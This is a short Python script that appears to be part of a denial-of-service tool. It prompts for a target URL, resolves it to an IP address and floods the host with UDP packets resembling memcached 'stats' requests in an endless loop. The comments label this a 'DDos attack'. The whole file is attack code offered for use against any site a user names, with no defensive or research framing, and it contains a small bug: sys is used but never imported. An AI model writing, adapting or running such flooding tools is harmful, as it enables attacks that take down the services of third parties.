import socket
import platform
import time
import os

# Define some colors for terminal output
REE = '\033[31m'
GREEN = '\033[32m'
YELLOW = '\033[93m'
RESET = '\033[0m'

# Get the operating system
system = platform.uname()[0]

def cls():
    """Clear the screen based on the OS."""
    if system == 'Windows':
        os.system("cls")
    else:  # Mac, Linux, or any other Unix-like system
        os.system("clear")

# Clear the screen and display the logo
cls()
os.system("python3 src/logo.py")  # Assuming you're using Python 3

# Get the target URL from the user
target = input(f"{GREEN}Enter Target URL: {RESET}")
target = target.replace("http://", "").replace("https://", "").replace("www.", "")

# Resolve the target URL to an IP address
try:
    ip = socket.gethostbyname(target)
except socket.gaierror:
    print(f"{REE}Error: Could not resolve the target URL. Check your input and try again.{RESET}")
    sys.exit(1)

port = 8020
joker = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"

# Create a UDP socket and send the payload
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Send the initial packets
for _ in range(3):  # Send 3 packets initially
    sock.sendto(bytes(joker, "UTF-8"), (ip, port))
    print(f"{YELLOW}{port}{RESET} IP site address >> {ip}")

time.sleep(4)  # Wait for 4 seconds before starting the loop

# Start the DDos loop
try:
    while True:
        sock.sendto(bytes(joker, "UTF-8"), (ip, port))
        print(f"{YELLOW}{port}{RESET} DDos >> {target} | Ip Address: {ip}")
        time.sleep(0.1)  # Add a small delay to avoid spamming too fast
except KeyboardInterrupt:
    print(f"{REE}\nDDos attack stopped by user.{RESET}")
finally:
    sock.close()  # Close the socket when done
